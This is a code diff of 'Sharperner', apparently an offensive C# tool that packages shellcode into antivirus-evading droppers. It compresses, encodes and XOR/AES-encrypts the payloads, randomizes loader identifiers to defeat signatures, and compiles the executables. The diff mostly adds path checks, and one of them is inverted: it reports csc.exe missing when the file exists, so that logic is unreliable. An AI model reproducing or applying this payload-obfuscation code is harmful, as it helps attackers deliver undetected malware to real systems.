@@ -331,7 +331,15 @@ namespace Sharperner
     {
         public static void CompileWithMSBuild(string msBuildPath, string slnFile, string projectName)
         {
-            var strCmd = $"/c \"{msBuildPath}\\MSBuild\\Current\\Bin\\MSBuild.exe\" {slnFile} /t:{projectName} /p:Configuration=Release /p:Platform=x64";
+            var executablePath = $"\"{msBuildPath}\\MSBuild\\Current\\Bin\\MSBuild.exe\"";
+
+            if(string.IsNullOrEmpty(executablePath) || !executablePath.Contains("MSBuild.exe") || !executablePath.EndsWith(".exe"))
+            {
+                Console.WriteLine("[!] MSBuild.exe executable not found in path");
+                Environment.Exit(0);
+            }
+
+            var strCmd = $"/c {executablePath} {slnFile} /t:{projectName} /p:Configuration=Release /p:Platform=x64";
 
             using (Process compiler = new Process())
             {
@@ -344,11 +352,12 @@ namespace Sharperner
             }
         }
 
-        public static void CompileAssembly(string outputFile, string tempFile)
+        public static void CompileAssembly(string cscPath, string outputFile, string tempFile)
         {
             //compile the code
             //https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.process.standarderror?redirectedfrom=MSDN&view=net-5.0#System_Diagnostics_Process_StandardError
-            string strCmd = $"/c C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:{outputFile} {tempFile}";
+
+            string strCmd = $"/c {cscPath} /out:{outputFile} {tempFile}";
             try
             {
                 Process process = new Process();
@@ -558,7 +567,8 @@ namespace Sharperner
 
         public static string GetMSBuildPath()
         {
-            var processInfo = new ProcessStartInfo("cmd.exe", "/c \"C:\\Program Files (x86)\\Microsoft Visual Studio\\Installer\\vswhere.exe\" -latest -products * -requires Microsoft.Component.MSBuild -property installationPath")
+            var cmd = "\"C:\\Program Files (x86)\\Microsoft Visual Studio\\Installer\\vswhere.exe\" -latest -products * -requires Microsoft.Component.MSBuild -property installationPath";
+            var processInfo = new ProcessStartInfo("cmd.exe", $"/c {cmd}")
             {
                 CreateNoWindow = true,
                 UseShellExecute = false,
@@ -572,6 +582,7 @@ namespace Sharperner
             p.OutputDataReceived += (sender, a) => sb.AppendLine(a.Data);
             p.BeginOutputReadLine();
             p.WaitForExit();
+
             return(sb.ToString().Trim());
         }
 
@@ -679,79 +690,88 @@ Sharperner.exe /file:file.txt /out:payload.exe
 
                                 var PEFile = File.ReadAllBytes(filePath);
                                 var msBuildPath = GetMSBuildPath();
-                                var slnFile = Path.Combine(parentDir, @"Sharperner.sln");
-
-                                MorseForFun.InitializeDictionary();
-
-                                var compByteArray = Compress(PEFile);
-                                var b64String = Convert.ToBase64String(compByteArray);
-                                var morsedb64String = MorseForFun.Send(b64String);
-
-                                try
+                                
+                                if (string.IsNullOrEmpty(msBuildPath))
                                 {
-                                    //replace all occurences
-                                    string[] signatures = { "morsedb64string", "b64string", "bufferByteArray", "deCompByteArray", "MapMap", "Menyeluruh", "PanggilMapPEMod", "GetPeMetaData", "GetNativeExportAddress",
+                                    Console.WriteLine("[!] MSBuild path not found");
+                                }
+                                else
+                                {
+                                    var slnFile = Path.Combine(parentDir, @"Sharperner.sln");
+
+                                    MorseForFun.InitializeDictionary();
+
+                                    var compByteArray = Compress(PEFile);
+                                    var b64String = Convert.ToBase64String(compByteArray);
+                                    var morsedb64String = MorseForFun.Send(b64String);
+
+                                    try
+                                    {
+                                        //replace all occurences
+                                        string[] signatures = { "morsedb64string", "b64string", "bufferByteArray", "deCompByteArray", "MapMap", "Menyeluruh", "PanggilMapPEMod", "GetPeMetaData", "GetNativeExportAddress",
                                                     "GetExportAddress", "GetLoadedModuleAddress", "GetLibraryAddress", "LoadModuleFromDisk", "DynamicAPIInvoke", "AllocateBytesToMemory", "RelocateModule",
                                                     "RewriteModuleIAT", "SetModuleSectionPermissions", "MapThisToMemory", "MapModuleToMemory", "DLLName", "FunctionName", "PeHeader", "OptHeaderSize", "OptHeader",
                                                     "Magic", "pExport", "ExportRVA", "OrdinalBase", "NumberOfFunctions", "NumberOfNames", "FunctionsRVA", "NamesRVA", "OrdinalsRVA"};
 
-                                    foreach (string signature in signatures)
-                                    {
-                                        string randomWord = GenerateRandomString();
-
-                                        // randomizing in SharpSploit's lib
-                                        foreach (var file in Directory.EnumerateFiles($"{parentDir}\\DInvoke\\Execution", "*.*", SearchOption.AllDirectories).Where(i => i.EndsWith(".cs")))
+                                        foreach (string signature in signatures)
                                         {
-                                            string libFileContent = File.ReadAllText(file);
+                                            string randomWord = GenerateRandomString();
 
-                                            loaderFileContent = loaderFileContent.Replace(signature, randomWord);
-                                            
-                                            libFileContent = libFileContent.Replace(signature, randomWord);
-                                            
-                                            File.WriteAllText(file, libFileContent);
+                                            // randomizing in SharpSploit's lib
+                                            foreach (var file in Directory.EnumerateFiles($"{parentDir}\\DInvoke\\Execution", "*.*", SearchOption.AllDirectories).Where(i => i.EndsWith(".cs")))
+                                            {
+                                                string libFileContent = File.ReadAllText(file);
 
+                                                loaderFileContent = loaderFileContent.Replace(signature, randomWord);
+
+                                                libFileContent = libFileContent.Replace(signature, randomWord);
+
+                                                File.WriteAllText(file, libFileContent);
+
+                                            }
                                         }
+
+                                        loaderFileContent = loaderFileContent.Replace("REPLACE MORSECODE HERE", morsedb64String);
+
+                                    }
+                                    catch
+                                    {
+                                        Console.WriteLine("[!] Error replacing values");
                                     }
 
-                                    loaderFileContent = loaderFileContent.Replace("REPLACE MORSECODE HERE", morsedb64String);
+                                    try
+                                    {
+                                        File.WriteAllText(nativeBinaryLoaderPath, loaderFileContent);
 
+                                        Compile.CompileWithMSBuild(msBuildPath, slnFile, "DInvoke");
+
+                                        Thread.Sleep(2000);
+
+                                        File.Copy(nativeExecutableBinaryLoaderPath, $"{Directory.GetCurrentDirectory()}\\{outputFile}", true);
+
+                                        Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
+                                    }
+                                    catch
+                                    {
+                                        Console.WriteLine("[!] Couldn't find the compiled executable. Possibly shellcode is too big");
+                                    }
+
+                                    Console.WriteLine("[+] Doing some cleaning...");
+
+                                    //revert all library files
+                                    foreach (var file in Directory.EnumerateFiles($"{parentDir}\\DInvoke\\Execution", "*.*", SearchOption.AllDirectories).Where(i => i.EndsWith(".cs")))
+                                    {
+                                        File.Copy($"{file}.ori", file, true);
+                                    }
+
+                                    //revert nativeBinaryLoader
+                                    File.WriteAllText(nativeBinaryLoaderPath, tempLoaderFileContent);
+
+                                    File.Delete(nativeExecutableBinaryLoaderPath);
+
+                                    Thread.Sleep(1000);
                                 }
-                                catch
-                                {
-                                    Console.WriteLine("[!] Error replacing values");
-                                }
-
-                                try
-                                {
-                                    File.WriteAllText(nativeBinaryLoaderPath, loaderFileContent);
-
-                                    Compile.CompileWithMSBuild(msBuildPath, slnFile, "DInvoke");
-
-                                    Thread.Sleep(2000);
-
-                                    File.Copy(nativeExecutableBinaryLoaderPath, $"{Directory.GetCurrentDirectory()}\\{outputFile}", true);
-
-                                    Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
-                                }
-                                catch
-                                {
-                                    Console.WriteLine("[!] Couldn't find the compiled executable. Possibly shellcode is too big");
-                                }
-
-                                Console.WriteLine("[+] Doing some cleaning...");
-
-                                //revert all library files
-                                foreach (var file in Directory.EnumerateFiles($"{parentDir}\\DInvoke\\Execution", "*.*", SearchOption.AllDirectories).Where(i => i.EndsWith(".cs")))
-                                {
-                                    File.Copy($"{file}.ori", file, true);
-                                }
-
-                                //revert nativeBinaryLoader
-                                File.WriteAllText(nativeBinaryLoaderPath, tempLoaderFileContent);
-
-                                File.Delete(nativeExecutableBinaryLoaderPath);
-
-                                Thread.Sleep(1000);
+                                
                             }
                         }
                         else
@@ -898,82 +918,91 @@ Sharperner.exe /file:file.txt /out:payload.exe
 
                         string templateFileContent = "";
 
-                        // read all content
-                        if (!File.Exists(templateFile)) //if file exists
+                        var cscPath = $"\"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe\"";
+
+                        if (File.Exists(cscPath))
                         {
-                            Console.WriteLine("[!] File does not exists in local, fetching online...");
-                            ServicePointManager.Expect100Continue = true;
-                            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
-                            WebClient client = new WebClient();
-                            try
-                            {
-                                templateFileContent = client.DownloadString("https://raw.githubusercontent.com/aniqfakhrul/Sharperner/main/templates/template.cs");
-                            }
-                            catch
-                            {
-                                Console.WriteLine("[!] No internet connection");
-                                Environment.Exit(0);
-                            }
+                            Console.WriteLine("[!] csc.exe not found in path");
                         }
                         else
                         {
-                            templateFileContent = File.ReadAllText(templateFile);
-                        }
-
-                        try
-                        {
-                            // randomize method names
-                            var pattern = @"(public|private|static|\s) +[\w\<\>\[\]]+\s+(\w+) *\([^\)]*\) *(\{?|[^;])";
-                            var methodNamesPattern = @"([a-zA-Z_{1}][a-zA-Z0-9_]+)(?=\()";
-                            Regex rg = new Regex(pattern);
-                            MatchCollection methods = rg.Matches(templateFileContent);
-                            foreach (var method in methods)
+                            // read all content
+                            if (!File.Exists(templateFile)) //if file exists
                             {
-                                if (!method.ToString().Contains("Main"))
+                                Console.WriteLine("[!] File does not exists in local, fetching online...");
+                                ServicePointManager.Expect100Continue = true;
+                                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+                                WebClient client = new WebClient();
+                                try
                                 {
-                                    var methodName = Regex.Match(method.ToString(), methodNamesPattern);
-                                    templateFileContent = templateFileContent.Replace(methodName.ToString(), GenerateRandomString());
+                                    templateFileContent = client.DownloadString("https://raw.githubusercontent.com/aniqfakhrul/Sharperner/main/templates/template.cs");
                                 }
-
+                                catch
+                                {
+                                    Console.WriteLine("[!] No internet connection");
+                                    Environment.Exit(0);
+                                }
+                            }
+                            else
+                            {
+                                templateFileContent = File.ReadAllText(templateFile);
                             }
 
-                            //randomize variable names
-                            string[] variableNames = { "xoredAesB64", "xorKey", "aE5k3y", "aE5Iv", "aesEncrypted", "sh3Llc0d3", "lpNumberOfBytesWritten", "processInfo",
+                            try
+                            {
+                                // randomize method names
+                                var pattern = @"(public|private|static|\s) +[\w\<\>\[\]]+\s+(\w+) *\([^\)]*\) *(\{?|[^;])";
+                                var methodNamesPattern = @"([a-zA-Z_{1}][a-zA-Z0-9_]+)(?=\()";
+                                Regex rg = new Regex(pattern);
+                                MatchCollection methods = rg.Matches(templateFileContent);
+                                foreach (var method in methods)
+                                {
+                                    if (!method.ToString().Contains("Main"))
+                                    {
+                                        var methodName = Regex.Match(method.ToString(), methodNamesPattern);
+                                        templateFileContent = templateFileContent.Replace(methodName.ToString(), GenerateRandomString());
+                                    }
+
+                                }
+
+                                //randomize variable names
+                                string[] variableNames = { "xoredAesB64", "xorKey", "aE5k3y", "aE5Iv", "aesEncrypted", "sh3Llc0d3", "lpNumberOfBytesWritten", "processInfo",
                                                 "pHandle", "rMemAddress", "tHandle", "ptr", "theKey", "mixed", "input", "theKeystring", "cipherText", "rawKey", "rawIV", "rijAlg", "decryptor",
                                                 "msDecrypt", "csDecrypt", "srDecrypt", "plaintext", "cipherData", "decryptedData", "ms", "cs", "alg", "MorseForFun","startInfo","procInfo", "binaryPath",
                                                 "random", "aes_key", "aes_iv", "stringBuilder"};
 
-                            foreach (string variableName in variableNames)
+                                foreach (string variableName in variableNames)
+                                {
+                                    templateFileContent = templateFileContent.Replace(variableName, GenerateRandomString());
+                                }
+
+                                // replace in template file
+                                templateFileContent = templateFileContent.Replace("\"REPLACE SHELLCODE HERE\"", xorAesEncStringB64).Replace("\"REPLACE XORKEY\"", xorKey).Replace("\"REPLACE A3S_KEY\"", morsed_aeskey).Replace("\"REPLACE A3S_IV\"", morsed_aesiv);
+
+                            }
+                            catch (Exception err)
                             {
-                                templateFileContent = templateFileContent.Replace(variableName, GenerateRandomString());
+                                Console.WriteLine($"[!] {err.Message}");
                             }
 
-                            // replace in template file
-                            templateFileContent = templateFileContent.Replace("\"REPLACE SHELLCODE HERE\"", xorAesEncStringB64).Replace("\"REPLACE XORKEY\"", xorKey).Replace("\"REPLACE A3S_KEY\"", morsed_aeskey).Replace("\"REPLACE A3S_IV\"", morsed_aesiv);
+                            // write all back into the file
+                            try
+                            {
+                                Console.WriteLine("[+] Writing shellcode to template file...");
+                                File.WriteAllText(tempFile, templateFileContent);
+                            }
+                            catch (Exception err)
+                            {
+                                Console.WriteLine($"[!] Error writing shellcode to template file with the following error {err.Message}");
+                            }
 
+                            Compile.CompileAssembly(cscPath, outputFile, tempFile);
+
+                            Console.WriteLine($"[+] Doing some cleaning...");
+                            Thread.Sleep(1000);
+
+                            File.Delete(tempFile);
                         }
-                        catch (Exception err)
-                        {
-                            Console.WriteLine($"[!] {err.Message}");
-                        }
-
-                        // write all back into the file
-                        try
-                        {
-                            Console.WriteLine("[+] Writing shellcode to template file...");
-                            File.WriteAllText(tempFile, templateFileContent);
-                        }
-                        catch (Exception err)
-                        {
-                            Console.WriteLine($"[!] Error writing shellcode to template file with the following error {err.Message}");
-                        }
-
-                        Compile.CompileAssembly(outputFile, tempFile);
-
-                        Console.WriteLine($"[+] Doing some cleaning...");
-                        Thread.Sleep(1000);
-
-                        File.Delete(tempFile);
 
                     }
                     else if (dropperFormat == "cpp")
